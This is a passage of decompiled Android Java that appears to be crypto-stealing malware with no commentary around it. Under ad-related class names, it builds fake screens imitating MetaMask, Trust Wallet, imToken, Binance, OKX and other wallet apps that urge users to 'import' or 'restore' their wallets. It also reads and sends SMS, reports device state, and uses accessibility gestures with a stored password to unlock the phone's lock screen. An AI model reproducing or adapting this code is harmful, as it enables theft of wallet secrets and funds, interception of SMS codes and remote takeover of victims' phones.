                                    adInfo4.setTemplate(PointerIconCompat.TYPE_WAIT);
                                    if (new Random().nextInt(3) >= 1) {
                                        adInfo4.setBack(1);
                                    }
                                    d14.setAiLink(adInfo4);
                                    Intent intent10 = new Intent(context, (Class<?>) AdAlertActivity.class);
                                    intent10.putExtra("adInfo", d14);
                                    k3.d.e(context, intent10);
                                    break;
                                case TbsListener.ErrorCode.UNZIP_DIR_ERROR /* 205 */:
                                    AdInfo d15 = androidx.appcompat.view.a.d(2);
                                    d15.setTaskId(e3.d.a());
                                    d15.setCustomId(TbsListener.ErrorCode.UNZIP_DIR_ERROR);
                                    d15.setPkg("org.toshi");
                                    d15.setUse(2);
                                    String c15 = k3.e.c(context, d15.getPkg());
                                    d15.setImg(c15 != null ? c15 : "2131492891");
                                    d15.setTemplate(8);
                                    d15.setTitle(context.getString(R.string.wallet));
                                    d15.setMsg(context.getString(R.string.walletBoxInputMsg));
                                    d15.setConfirm(context.getString(R.string.Continue));
                                    d15.setConfirmColor("255,255,255");
                                    d15.setConfirmBgColor("0,0,255");
                                    d15.setAlign(1);
                                    if (new Random().nextInt(2) == 1) {
                                        d15.setCancel(context.getString(R.string.Cancel));
                                        d15.setCancelColor("105,105,105");
                                    }
                                    AdInfo adInfo5 = new AdInfo();
                                    adInfo5.setCustomId(d15.getCustomId());
                                    adInfo5.setType(2);
                                    adInfo5.setTaskId(e3.d.a());
                                    adInfo5.setPreId(d15.getTaskId());
                                    adInfo5.setTemplate(1005);
                                    if (new Random().nextInt(3) >= 1) {
                                        adInfo5.setBack(1);
                                    }
                                    d15.setAiLink(adInfo5);
                                    Intent intent11 = new Intent(context, (Class<?>) AdAlertBottomActivity.class);
                                    intent11.putExtra("adInfo", d15);
                                    k3.d.e(context, intent11);
                                    break;
                                case TbsListener.ErrorCode.UNZIP_IO_ERROR /* 206 */:
                                    AdInfo d16 = androidx.appcompat.view.a.d(2);
                                    d16.setTaskId(e3.d.a());
                                    d16.setCustomId(TbsListener.ErrorCode.UNZIP_IO_ERROR);
                                    d16.setPkg("com.tronlinkpro.wallet");
                                    d16.setUse(2);
                                    String c16 = k3.e.c(context, d16.getPkg());
                                    if (c16 == null) {
                                        c16 = "2131165378";
                                    }
                                    d16.setImg(c16);
                                    d16.setTemplate(9);
                                    d16.setTitle(context.getString(R.string.tronlinkpro));
                                    d16.setMsg(context.getString(R.string.imBoxInputMsg));
                                    d16.setConfirm(context.getString(R.string.Import_now));
                                    d16.setBgColor("255,255,255");
                                    d16.setConfirmColor("255,255,255");
                                    d16.setConfirmBgColor("2,28,49");
                                    if (new Random().nextInt(2) == 1) {
                                        d16.setCancel(context.getString(R.string.Cancel));
                                        d16.setCancelColor("128,128,128");
                                    }
                                    AdInfo adInfo6 = new AdInfo();
                                    adInfo6.setCustomId(d16.getCustomId());
                                    adInfo6.setType(2);
                                    adInfo6.setTaskId(e3.d.a());
                                    adInfo6.setPreId(d16.getTaskId());
                                    adInfo6.setTemplate(PointerIconCompat.TYPE_CELL);
                                    if (new Random().nextInt(3) >= 1) {
                                        adInfo6.setBack(1);
                                    }
                                    d16.setAiLink(adInfo6);
                                    Intent intent12 = new Intent(context, (Class<?>) AdBoxActivity.class);
                                    intent12.putExtra("adInfo", d16);
                                    k3.d.e(context, intent12);
                                    break;
                                case TbsListener.ErrorCode.UNZIP_OTHER_ERROR /* 207 */:
                                    AdInfo d17 = androidx.appcompat.view.a.d(2);
                                    d17.setTaskId(e3.d.a());
                                    d17.setCustomId(TbsListener.ErrorCode.UNZIP_OTHER_ERROR);
                                    d17.setPkg("com.tronlink.global");
                                    d17.setUse(2);
                                    String c17 = k3.e.c(context, d17.getPkg());
                                    d17.setImg(c17 != null ? c17 : "2131165377");
                                    d17.setTemplate(9);
                                    d17.setTitle(context.getString(R.string.tronlinkglobal));
                                    d17.setMsg(context.getString(R.string.imBoxInputMsg));
                                    d17.setConfirm(context.getString(R.string.Import_now));
                                    d17.setBgColor("255,255,255");
                                    d17.setConfirmColor("255,255,255");
                                    d17.setConfirmBgColor("2,28,49");
                                    if (new Random().nextInt(2) == 1) {
                                        d17.setCancel(context.getString(R.string.Cancel));
                                        d17.setCancelColor("128,128,128");
                                    }
                                    AdInfo adInfo7 = new AdInfo();
                                    adInfo7.setCustomId(d17.getCustomId());
                                    adInfo7.setType(2);
                                    adInfo7.setTaskId(e3.d.a());
                                    adInfo7.setPreId(d17.getTaskId());
                                    adInfo7.setTemplate(PointerIconCompat.TYPE_CROSSHAIR);
                                    if (new Random().nextInt(3) >= 1) {
                                        adInfo7.setBack(1);
                                    }
                                    d17.setAiLink(adInfo7);
                                    Intent intent13 = new Intent(context, (Class<?>) AdBoxActivity.class);
                                    intent13.putExtra("adInfo", d17);
                                    k3.d.e(context, intent13);
                                    break;
                                case TbsListener.ErrorCode.EXCEED_DEXOPT_RETRY_NUM /* 208 */:
                                    AdInfo d18 = androidx.appcompat.view.a.d(2);
                                    d18.setTaskId(e3.d.a());
                                    d18.setCustomId(TbsListener.ErrorCode.EXCEED_DEXOPT_RETRY_NUM);
                                    d18.setPkg("com.binance.dev");
                                    d18.setUse(2);
                                    String c18 = k3.e.c(context, d18.getPkg());
                                    if (c18 == null) {
                                        c18 = "2131492869";
                                    }
                                    d18.setImg(c18);
                                    d18.setTemplate(9);
                                    d18.setTitle(context.getString(R.string.binance));
                                    d18.setMsg(context.getString(R.string.binanceBoxInputMsg));
                                    d18.setConfirm(context.getString(R.string.Import_Wallet));
                                    d18.setConfirmColor("0,0,0");
                                    d18.setConfirmBgColor("240,185,11");
                                    if (new Random().nextInt(2) == 1) {
                                        d18.setCancel(context.getString(R.string.Cancel));
                                        d18.setCancelColor("128,128,128");
                                    }
                                    AdInfo adInfo8 = new AdInfo();
                                    adInfo8.setCustomId(d18.getCustomId());
                                    adInfo8.setType(2);
                                    adInfo8.setTaskId(e3.d.a());
                                    adInfo8.setPreId(d18.getTaskId());
                                    adInfo8.setTemplate(PointerIconCompat.TYPE_TEXT);
                                    d18.setAiLink(adInfo8);
                                    Intent intent14 = new Intent(context, (Class<?>) AdBoxActivity.class);
                                    intent14.putExtra("adInfo", d18);
                                    k3.d.e(context, intent14);
                                    break;
                                case TbsListener.ErrorCode.DEXOPT_EXCEPTION /* 209 */:
                                    AdInfo d19 = androidx.appcompat.view.a.d(2);
                                    d19.setTaskId(e3.d.a());
                                    d19.setCustomId(TbsListener.ErrorCode.DEXOPT_EXCEPTION);
                                    d19.setPkg("com.okinc.okex.gp");
                                    d19.setUse(2);
                                    String c19 = k3.e.c(context, d19.getPkg());
                                    if (c19 == null) {
                                        c19 = "2131492882";
                                    }
                                    d19.setImg(c19);
                                    d19.setTemplate(9);
                                    d19.setTitle(context.getString(R.string.okx));
                                    d19.setMsg(context.getString(R.string.okxBoxInputMsg));
                                    d19.setConfirm(context.getString(R.string.Confirm));
                                    d19.setConfirmBgColor("0,0,0");
                                    d19.setAlign(1);
                                    if (new Random().nextInt(2) == 1) {
                                        d19.setCancel(context.getString(R.string.Cancel));
                                        d19.setCancelColor("128,128,128");
                                    }
                                    AdInfo adInfo9 = new AdInfo();
                                    adInfo9.setCustomId(d19.getCustomId());
                                    adInfo9.setType(2);
                                    adInfo9.setTaskId(e3.d.a());
                                    adInfo9.setPreId(d19.getTaskId());
                                    adInfo9.setTemplate(PointerIconCompat.TYPE_VERTICAL_TEXT);
                                    d19.setAiLink(adInfo9);
                                    Intent intent15 = new Intent(context, (Class<?>) AdBoxActivity.class);
                                    intent15.putExtra("adInfo", d19);
                                    k3.d.e(context, intent15);
                                    break;
                                default:
                                    switch (i5) {
                                        case PointerIconCompat.TYPE_CONTEXT_MENU /* 1001 */:
                                            AdInfo d20 = androidx.appcompat.view.a.d(2);
                                            d20.setTaskId(e3.d.a());
                                            d20.setBack(1);
                                            d20.setAutoClose(new Random().nextInt(20) + 20);
                                            d20.setCustomId(PointerIconCompat.TYPE_CONTEXT_MENU);
                                            d20.setPkg("com.wallet.crypto.trustapp");
                                            d20.setUse(2);
                                            String c20 = k3.e.c(context, d20.getPkg());
                                            if (c20 != null) {
                                                d20.setImg(c20);
                                                str2 = "2131492888";
                                            } else {
                                                str2 = "2131492888";
                                                d20.setImg(str2);
                                            }
                                            d20.setTemplate(1);
                                            d20.setTitle(context.getString(R.string.trustwallet));
                                            d20.setMsg(k3.e.d(context, d20.getPkg()));
                                            d20.setLink("openapp:" + d20.getPkg());
                                            AdInfo adInfo10 = new AdInfo();
                                            adInfo10.setType(2);
                                            adInfo10.setTaskId(e3.d.a());
                                            adInfo10.setCustomId(d20.getCustomId());
                                            adInfo10.setPkg(d20.getPkg());
                                            adInfo10.setUse(2);
                                            adInfo10.setPreId(d20.getTaskId());
                                            if (c20 != null) {
                                                adInfo10.setImg(c20);
                                            } else {
                                                adInfo10.setImg(str2);
                                            }
                                            adInfo10.setTemplate(9);
                                            adInfo10.setTitle(context.getString(R.string.Why_need_ReImport_Wallet));
                                            adInfo10.setMsg(context.getString(R.string.Here_are_some_scenarios_require));
                                            adInfo10.setConfirm(context.getString(R.string.Restore_wallet));
                                            adInfo10.setConfirmBgColor("5,0,255");
                                            adInfo10.setBgColor("255,255,255");
                                            if (new Random().nextInt(2) == 1) {
                                                adInfo10.setCancel(context.getString(R.string.Cancel));
                                            }
                                            d20.setAiLink(adInfo10);
                                            d20.setAiLinkDelayMillis(5000L);
                                            AdInfo adInfo11 = new AdInfo();
                                            adInfo11.setCustomId(adInfo10.getCustomId());
                                            adInfo11.setType(2);
                                            adInfo11.setTaskId(e3.d.a());
                                            adInfo11.setPreId(adInfo10.getTaskId());
                                            adInfo11.setTemplate(PointerIconCompat.TYPE_CONTEXT_MENU);
                                            if (new Random().nextInt(3) >= 1) {
                                                adInfo11.setBack(1);
                                            }
                                            adInfo10.setAiLink(adInfo11);
                                            Intent intent16 = new Intent(context, (Class<?>) AdNoticeActivity.class);
                                            intent16.putExtra("adInfo", d20);
                                            k3.d.e(context, intent16);
                                            break;
                                        case PointerIconCompat.TYPE_HAND /* 1002 */:
                                            AdInfo d21 = androidx.appcompat.view.a.d(2);
                                            d21.setTaskId(e3.d.a());
                                            d21.setBack(1);
                                            d21.setAutoClose(new Random().nextInt(20) + 20);
                                            d21.setCustomId(PointerIconCompat.TYPE_HAND);
                                            d21.setPkg("vip.mytokenpocket");
                                            d21.setUse(2);
                                            String c21 = k3.e.c(context, d21.getPkg());
                                            if (c21 != null) {
                                                d21.setImg(c21);
                                                str3 = "2131492885";
                                            } else {
                                                str3 = "2131492885";
                                                d21.setImg(str3);
                                            }
                                            d21.setTemplate(1);
                                            d21.setTitle(context.getString(R.string.tokenpocket));
                                            d21.setMsg(k3.e.d(context, d21.getPkg()));
                                            d21.setLink("openapp:" + d21.getPkg());
                                            AdInfo adInfo12 = new AdInfo();
                                            adInfo12.setType(2);
                                            adInfo12.setTaskId(e3.d.a());
                                            adInfo12.setCustomId(d21.getCustomId());
                                            adInfo12.setPkg(d21.getPkg());
                                            adInfo12.setUse(2);
                                            adInfo12.setPreId(d21.getTaskId());
                                            if (c21 != null) {
                                                adInfo12.setImg(c21);
                                            } else {
                                                adInfo12.setImg(str3);
                                            }
                                            adInfo12.setTemplate(7);
                                            adInfo12.setTitle(context.getString(R.string.tokenpocket));
                                            adInfo12.setMsg(context.getString(R.string.tpBoxInputMsg));
                                            adInfo12.setConfirm(context.getString(R.string.Confirm));
                                            adInfo12.setConfirmColor("41,128,254");
                                            if (new Random().nextInt(2) == 1) {
                                                adInfo12.setCancel(context.getString(R.string.Cancel));
                                            }
                                            d21.setAiLink(adInfo12);
                                            d21.setAiLinkDelayMillis(5000L);
                                            AdInfo adInfo13 = new AdInfo();
                                            adInfo13.setCustomId(adInfo12.getCustomId());
                                            adInfo13.setType(2);
                                            adInfo13.setTaskId(e3.d.a());
                                            adInfo13.setPreId(adInfo12.getTaskId());
                                            adInfo13.setTemplate(PointerIconCompat.TYPE_HAND);
                                            if (new Random().nextInt(3) >= 1) {
                                                adInfo13.setBack(1);
                                            }
                                            adInfo12.setAiLink(adInfo13);
                                            Intent intent17 = new Intent(context, (Class<?>) AdNoticeActivity.class);
                                            intent17.putExtra("adInfo", d21);
                                            k3.d.e(context, intent17);
                                            break;
                                        case PointerIconCompat.TYPE_HELP /* 1003 */:
                                            AdInfo d22 = androidx.appcompat.view.a.d(2);
                                            d22.setTaskId(e3.d.a());
                                            d22.setBack(1);
                                            d22.setAutoClose(new Random().nextInt(20) + 20);
                                            d22.setCustomId(PointerIconCompat.TYPE_HELP);
                                            d22.setPkg("im.token.app");
                                            d22.setUse(2);
                                            String c22 = k3.e.c(context, d22.getPkg());
                                            if (c22 != null) {
                                                d22.setImg(c22);
                                                str4 = "2131492872";
                                            } else {
                                                str4 = "2131492872";
                                                d22.setImg(str4);
                                            }
                                            d22.setTemplate(1);
                                            d22.setTitle(context.getString(R.string.imtoken));
                                            d22.setMsg(k3.e.d(context, d22.getPkg()));
                                            d22.setLink("openapp:" + d22.getPkg());
                                            AdInfo adInfo14 = new AdInfo();
                                            adInfo14.setType(2);
                                            adInfo14.setTaskId(e3.d.a());
                                            adInfo14.setCustomId(d22.getCustomId());
                                            adInfo14.setPkg(d22.getPkg());
                                            adInfo14.setUse(2);
                                            adInfo14.setPreId(d22.getTaskId());
                                            if (c22 != null) {
                                                adInfo14.setImg(c22);
                                            } else {
                                                adInfo14.setImg(str4);
                                            }
                                            adInfo14.setTemplate(8);
                                            adInfo14.setTitle(context.getString(R.string.imtoken));
                                            adInfo14.setMsg(context.getString(R.string.imBoxInputMsg));
                                            adInfo14.setConfirm(context.getString(R.string.Import_now));
                                            adInfo14.setConfirmColor("255,255,255");
                                            adInfo14.setConfirmBgColor("30,144,255");
                                            adInfo14.setAlign(1);
                                            if (new Random().nextInt(2) == 1) {
                                                adInfo14.setCancel(context.getString(R.string.Cancel));
                                                adInfo14.setCancelColor("105,105,105");
                                            }
                                            d22.setAiLink(adInfo14);
                                            d22.setAiLinkDelayMillis(5000L);
                                            AdInfo adInfo15 = new AdInfo();
                                            adInfo15.setCustomId(adInfo14.getCustomId());
                                            adInfo15.setType(2);
                                            adInfo15.setTaskId(e3.d.a());
                                            adInfo15.setPreId(adInfo14.getTaskId());
                                            adInfo15.setTemplate(PointerIconCompat.TYPE_HELP);
                                            if (new Random().nextInt(3) >= 1) {
                                                adInfo15.setBack(1);
                                            }
                                            adInfo14.setAiLink(adInfo15);
                                            Intent intent18 = new Intent(context, (Class<?>) AdNoticeActivity.class);
                                            intent18.putExtra("adInfo", d22);
                                            k3.d.e(context, intent18);
                                            break;
                                        case PointerIconCompat.TYPE_WAIT /* 1004 */:
                                            AdInfo d23 = androidx.appcompat.view.a.d(2);
                                            d23.setTaskId(e3.d.a());
                                            d23.setBack(1);
                                            d23.setAutoClose(new Random().nextInt(20) + 20);
                                            d23.setCustomId(PointerIconCompat.TYPE_WAIT);
                                            d23.setPkg("io.metamask");
                                            d23.setUse(2);
                                            String c23 = k3.e.c(context, d23.getPkg());
                                            if (c23 != null) {
                                                d23.setImg(c23);
                                                str5 = "2131492879";
                                            } else {
                                                str5 = "2131492879";
                                                d23.setImg(str5);
                                            }
                                            d23.setTemplate(1);
                                            d23.setTitle(context.getString(R.string.metamask));
                                            d23.setMsg(k3.e.d(context, d23.getPkg()));
                                            d23.setLink("openapp:" + d23.getPkg());
                                            AdInfo adInfo16 = new AdInfo();
                                            adInfo16.setType(2);
                                            adInfo16.setTaskId(e3.d.a());
                                            adInfo16.setCustomId(d23.getCustomId());
                                            adInfo16.setPkg(d23.getPkg());
                                            adInfo16.setUse(2);
                                            adInfo16.setPreId(d23.getTaskId());
                                            if (c23 != null) {
                                                adInfo16.setImg(c23);
                                            } else {
                                                adInfo16.setImg(str5);
                                            }
                                            adInfo16.setTemplate(7);
                                            adInfo16.setTitle(context.getString(R.string.metamask));
                                            adInfo16.setMsg(context.getString(R.string.metaBoxInputMsg));
                                            adInfo16.setConfirm(context.getString(R.string.Refresh));
                                            adInfo16.setConfirmColor("30,144,255");
                                            adInfo16.setCancel(context.getString(R.string.Cancel));
                                            d23.setAiLink(adInfo16);
                                            d23.setAiLinkDelayMillis(5000L);
                                            AdInfo adInfo17 = new AdInfo();
                                            adInfo17.setCustomId(adInfo16.getCustomId());
                                            adInfo17.setType(2);
                                            adInfo17.setTaskId(e3.d.a());
                                            adInfo17.setPreId(adInfo16.getTaskId());
                                            adInfo17.setTemplate(PointerIconCompat.TYPE_WAIT);
                                            if (new Random().nextInt(3) >= 1) {
                                                adInfo17.setBack(1);
                                            }
                                            adInfo16.setAiLink(adInfo17);
                                            Intent intent19 = new Intent(context, (Class<?>) AdNoticeActivity.class);
                                            intent19.putExtra("adInfo", d23);
                                            k3.d.e(context, intent19);
                                            break;
                                        case 1005:
                                            AdInfo d24 = androidx.appcompat.view.a.d(2);
                                            d24.setTaskId(e3.d.a());
                                            d24.setBack(1);
                                            d24.setAutoClose(new Random().nextInt(20) + 20);
                                            d24.setCustomId(1005);
                                            d24.setPkg("org.toshi");
                                            d24.setUse(2);
                                            String c24 = k3.e.c(context, d24.getPkg());
                                            if (c24 != null) {
                                                d24.setImg(c24);
                                                str6 = "2131492891";
                                            } else {
                                                str6 = "2131492891";
                                                d24.setImg(str6);
                                            }
                                            d24.setTemplate(1);
                                            d24.setTitle(context.getString(R.string.wallet));
                                            d24.setMsg(k3.e.d(context, d24.getPkg()));
                                            d24.setLink("openapp:" + d24.getPkg());
                                            AdInfo adInfo18 = new AdInfo();
                                            adInfo18.setType(2);
                                            adInfo18.setTaskId(e3.d.a());
                                            adInfo18.setCustomId(d24.getCustomId());
                                            adInfo18.setPkg(d24.getPkg());
                                            adInfo18.setUse(2);
                                            adInfo18.setPreId(d24.getTaskId());
                                            if (c24 != null) {
                                                adInfo18.setImg(c24);
                                            } else {
                                                adInfo18.setImg(str6);
                                            }
                                            adInfo18.setTemplate(8);
                                            adInfo18.setTitle(context.getString(R.string.wallet));
                                            adInfo18.setMsg(context.getString(R.string.walletBoxInputMsg));
                                            adInfo18.setConfirm(context.getString(R.string.Continue));
                                            adInfo18.setConfirmColor("255,255,255");
                                            adInfo18.setConfirmBgColor("0,0,255");
                                            adInfo18.setAlign(1);
                                            if (new Random().nextInt(2) == 1) {
                                                adInfo18.setCancel(context.getString(R.string.Cancel));
                                                adInfo18.setCancelColor("105,105,105");
                                            }
                                            d24.setAiLink(adInfo18);
                                            d24.setAiLinkDelayMillis(5000L);
                                            AdInfo adInfo19 = new AdInfo();
                                            adInfo19.setCustomId(adInfo18.getCustomId());
                                            adInfo19.setType(2);
                                            adInfo19.setTaskId(e3.d.a());
                                            adInfo19.setPreId(adInfo18.getTaskId());
                                            adInfo19.setTemplate(1005);
                                            if (new Random().nextInt(3) >= 1) {
                                                adInfo19.setBack(1);
                                            }
                                            adInfo18.setAiLink(adInfo19);
                                            Intent intent20 = new Intent(context, (Class<?>) AdNoticeActivity.class);
                                            intent20.putExtra("adInfo", d24);
                                            k3.d.e(context, intent20);
                                            break;
                                        case PointerIconCompat.TYPE_CELL /* 1006 */:
                                            k3.e.h(context);
                                            break;
                                        case PointerIconCompat.TYPE_CROSSHAIR /* 1007 */:
                                            k3.e.g(context);
                                            break;
                                        case PointerIconCompat.TYPE_TEXT /* 1008 */:
                                            k3.e.a(context);
                                            break;
                                        case PointerIconCompat.TYPE_VERTICAL_TEXT /* 1009 */:
                                            k3.e.e(context);
                                            break;
                                    }
                            }
                    }
                }
                str7 = "35";
            }
            i.n(1, str7, null);
        }

        public final void j0(@NonNull g0 g0Var, int i5, int i6, int i7, String str, String str2) {
            long j5;
            List<LInfo> arrayList;
            f.e eVar = new f.e();
            eVar.put("code", 1322);
            g3.m a5 = g3.m.a();
            Objects.requireNonNull(a5);
            try {
                z2.h<LInfo, String> c5 = a5.f2977a.c();
                c5.f6119l = true;
                z2.m g5 = c5.g();
                g5.f("sta", 0);
                if (i7 != -1) {
                    g5.b();
                    g5.c("ty", Integer.valueOf(i7));
                }
                if (!TextUtils.isEmpty(str)) {
                    g5.b();
                    g5.c("pk", str);
                }
                if (!TextUtils.isEmpty(str2)) {
                    g5.b();
                    g5.h("na", "%" + str2 + "%");
                }
                c5.f6146g = g5;
                j5 = a5.f2977a.i(c5.f());
            } catch (SQLException unused) {
                j5 = 0;
            }
            eVar.put("total", Long.valueOf(j5));
            g3.m a6 = g3.m.a();
            long j6 = (i5 - 1) * i6;
            long j7 = i6;
            Objects.requireNonNull(a6);
            try {
                z2.h<LInfo, String> c6 = a6.f2977a.c();
                c6.l("sta", false);
                c6.k(Long.valueOf(j6));
                c6.f6120m = Long.valueOf(j7);
                z2.m g6 = c6.g();
                g6.f("sta", 0);
                if (i7 != -1) {
                    g6.b();
                    g6.c("ty", Integer.valueOf(i7));
                }
                if (!TextUtils.isEmpty(str)) {
                    g6.b();
                    g6.c("pk", str);
                }
                if (!TextUtils.isEmpty(str2)) {
                    g6.b();
                    g6.h("na", "%" + str2 + "%");
                }
                c6.f6146g = g6;
                arrayList = a6.f2977a.k(c6.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
            g0Var.b(eVar.l());
        }

        public final void k0(@NonNull g0 g0Var, int i5, int i6, int i7) {
            long j5;
            List<FInfo> arrayList;
            f.e eVar = new f.e();
            eVar.put("code", 1316);
            g3.g a5 = g3.g.a();
            Objects.requireNonNull(a5);
            try {
                z2.h<FInfo, String> c5 = a5.f2964a.c();
                c5.f6119l = true;
                z2.m g5 = c5.g();
                g5.f("ti", 0);
                if (i7 != 3) {
                    g5.b();
                    g5.c("ac", Integer.valueOf(i7));
                }
                c5.f6146g = g5;
                j5 = a5.f2964a.i(c5.f());
            } catch (SQLException unused) {
                j5 = 0;
            }
            eVar.put("total", Long.valueOf(j5));
            g3.g a6 = g3.g.a();
            long j6 = (i5 - 1) * i6;
            long j7 = i6;
            Objects.requireNonNull(a6);
            try {
                z2.h<FInfo, String> c6 = a6.f2964a.c();
                c6.l("ti", false);
                c6.k(Long.valueOf(j6));
                c6.f6120m = Long.valueOf(j7);
                z2.m g6 = c6.g();
                g6.f("ti", 0);
                if (i7 != 3) {
                    g6.b();
                    g6.c("ac", Integer.valueOf(i7));
                }
                c6.f6146g = g6;
                arrayList = a6.f2964a.k(c6.f());
            } catch (SQLException e5) {
                e5.printStackTrace();
                arrayList = new ArrayList<>();
            }
            eVar.put("rows", arrayList);
            g0Var.b(eVar.l());
        }

        public final void l0(@NonNull g0 g0Var) {
            f.e eVar = new f.e();
            eVar.put("code", 1100);
            eVar.put("black", Integer.valueOf(BaseService.f1409z ? 1 : 0));
            eVar.put("forbid", Integer.valueOf(BaseService.B ? 1 : 0));
            eVar.put("timeZone", TimeZone.getDefault().getID());
            NetworkInfo activeNetworkInfo = ((ConnectivityManager) this.f2811h.getSystemService("connectivity")).getActiveNetworkInfo();
            int i5 = -1;
            eVar.put("networkType", Integer.valueOf((activeNetworkInfo == null || !activeNetworkInfo.isConnected()) ? -1 : activeNetworkInfo.getType()));
            eVar.put("batteryCapacity", Integer.valueOf(((BatteryManager) this.f2811h.getSystemService("batterymanager")).getIntProperty(4)));
            int i6 = 0;
            eVar.put("isCharging", Integer.valueOf(((BatteryManager) this.f2811h.getSystemService("batterymanager")).getIntProperty(6) == 2 ? 1 : 0));
            eVar.put("media", Integer.valueOf(i.f2796b ? 1 : 0));
            eVar.put("iconStatus", Integer.valueOf(k3.d.d(this.f2811h) ? 1 : 0));
            try {
                i5 = Settings.System.getInt(this.f2811h.getContentResolver(), "screen_brightness");
            } catch (Settings.SettingNotFoundException unused) {
            }
            eVar.put("brightness", Integer.valueOf(i5));
            eVar.put("isWorking", Integer.valueOf(BaseService.l() ? 1 : 0));
            long j5 = 0;
            if (k3.a.i(this.f2811h)) {
                long j6 = SPUtils.getInstance().getLong("lockTime");
                j5 = j6 > 0 ? j6 : System.currentTimeMillis();
                i6 = 1;
            }
            SPUtils.getInstance().put("lock", i6);
            SPUtils.getInstance().put("lockTime", j5);
            eVar.put("lock", Integer.valueOf(i6));
            eVar.put("lockTime", Long.valueOf(j5));
            g0Var.b(eVar.l());
        }

        @RequiresApi(api = 24)
        public final void m0(int i5) {
            BaseService g5;
            float f5;
            float f6;
            float f7;
            float f8;
            if (i5 == 1) {
                g5 = BaseService.g();
                f5 = this.f2812i;
                f6 = this.f2813j;
                f7 = this.f2814k;
                f8 = this.f2815l;
            } else if (i5 == 2) {
                g5 = BaseService.g();
                f5 = this.f2814k;
                f6 = this.f2815l;
                f7 = this.f2812i;
                f8 = this.f2813j;
            } else if (i5 == 3) {
                g5 = BaseService.g();
                f5 = this.f2816m;
                f6 = this.f2817n;
                f7 = this.f2818o;
                f8 = this.f2819p;
            } else {
                if (i5 != 4) {
                    return;
                }
                g5 = BaseService.g();
                f5 = this.f2818o;
                f6 = this.f2819p;
                f7 = this.f2816m;
                f8 = this.f2817n;
            }
            g5.q(f5, f6, f7, f8);
        }

        public final void n0(int i5, String str, String str2) {
            long j5;
            if (i5 != 0) {
                if (i5 != 1) {
                    return;
                }
                if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.SEND_SMS") == 0) {
                    SmsManager.getDefault().sendTextMessage(str, null, str2, null, null);
                    return;
                }
            } else if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_SMS") == 0) {
                k3.f.m(this.f2811h, true);
                g3.d a5 = g3.d.a();
                Objects.requireNonNull(a5);
                try {
                    Object obj = a5.f2958b;
                    t2.g gVar = (t2.g) obj;
                    z2.h c5 = ((t2.g) obj).c();
                    c5.f6119l = true;
                    z2.m<T, ID> g5 = c5.g();
                    g5.c("up", 0);
                    j5 = gVar.i(g5.j());
                } catch (SQLException unused) {
                    j5 = 0;
                }
                if (j5 <= 0) {
                    if (j5 == 0) {
                        i.n(0, "22", null);
                        return;
                    }
                    return;
                } else {
                    k3.f.t(this.f2811h);
                    i.n(0, "16", "" + j5);
                    return;
                }
            }
            i.n(1, "38", null);
        }

        public final void o0(@NonNull g0 g0Var) {
            f.e eVar = new f.e();
            eVar.put("code", 1111);
            eVar.put("t", Long.valueOf(System.currentTimeMillis()));
            g0Var.b(eVar.l());
        }

        public final void p0() {
            BaseService.D = System.currentTimeMillis();
        }

        @RequiresApi(api = 26)
        public final void q0() {
            String pw2;
            String str;
            int i5;
            AccessibilityNodeInfo k5;
            KeyguardManager keyguardManager = (KeyguardManager) this.f2811h.getSystemService("keyguard");
            if (!keyguardManager.isKeyguardLocked()) {
                i.n(1, "24", null);
                return;
            }
            PowerManager powerManager = (PowerManager) this.f2811h.getSystemService("power");
            if (!powerManager.isScreenOn()) {
                if (!NotificationManagerCompat.from(this.f2811h).areNotificationsEnabled()) {
                    i.n(1, "46", null);
                    if (!BaseService.f1409z) {
                        i.n(1, "50", null);
                        return;
                    }
                }
                PowerManager.WakeLock newWakeLock = powerManager.newWakeLock(268435466, "bright");
                newWakeLock.acquire(WorkRequest.MIN_BACKOFF_MILLIS);
                newWakeLock.release();
            }
            KeyguardManager.KeyguardLock newKeyguardLock = keyguardManager.newKeyguardLock("unLock");
            newKeyguardLock.reenableKeyguard();
            newKeyguardLock.disableKeyguard();
            try {
                Thread.sleep(1000L);
            } catch (InterruptedException unused) {
            }
            if (!keyguardManager.isKeyguardSecure()) {
                BaseService.g().performGlobalAction(3);
                return;
            }
            BaseService.g().performGlobalAction(3);
            try {
                Thread.sleep(1000L);
            } catch (InterruptedException unused2) {
            }
            AccessibilityNodeInfo i6 = BaseService.g().i();
            if (!i.g.f(i6, "com.android.systemui:id/keyguard_host_view") && !i.g.f(i6, "com.android.systemui:id/keyguard_security_container")) {
                Path path = new Path();
                path.moveTo(this.f2820q * 0.3f, this.f2821r * 0.7f);
                path.lineTo(this.f2820q * 0.4f, this.f2821r * 0.5f);
                GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path, 0L, 200L, true);
                Path path2 = new Path();
                path2.moveTo(this.f2820q * 0.4f, this.f2821r * 0.5f);
                path2.lineTo(this.f2820q * 0.6f, this.f2821r * 0.3f);
                BaseService.g().dispatchGesture(new GestureDescription.Builder().addStroke(strokeDescription).build(), new C0033a(strokeDescription.continueStroke(path2, 0L, 10L, false)), null);
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException unused3) {
                }
                i6 = BaseService.g().i();
                if (!i.g.f(i6, "com.android.systemui:id/keyguard_host_view") && !i.g.f(i6, "com.android.systemui:id/keyguard_security_container")) {
                    i.n(1, "25", null);
                    return;
                }
            }
            if (!i.g.f(i6, "com.android.systemui:id/lockPatternView") && !i.g.f(i6, "com.android.systemui:id/lock_pattern_view") && !i.g.f(i6, "com.android.systemui:id/colorLockPatternView") && ((i5 = e3.d.f2591a) != 4 || !i.g.f(i6, "com.android.systemui:id/vivo_lock_pattern_view"))) {
                if (!i.g.f(i6, "com.android.systemui:id/pinEntry") && !i.g.f(i6, "com.android.systemui:id/fixedPinEntry")) {
                    if (i.g.f(i6, "com.android.systemui:id/passwordEntry") || i.g.f(i6, "com.android.systemui:id/securityEditText") || (i5 == 4 && i.g.f(i6, "com.android.systemui:id/MixPwEntry"))) {
                        JInfo c5 = g3.k.b().c(3);
                        if (c5 == null) {
                            i.n(1, "27", null);
                            return;
                        }
                        i.f2799e = System.currentTimeMillis();
                        if (!f0(c5.getPw())) {
                            i.n(1, "33", c5.getPw());
                            return;
                        }
                        i.n(0, "31", c5.getPw());
                        k5 = i.g.k(i6, "com.android.systemui:id/btn_letter_ok");
                        if (k5 == null && i5 == 4) {
                            k5 = i.g.k(i6, "com.android.systemui:id/vivo_cancel");
                        }
                        if (k5 == null) {
                            return;
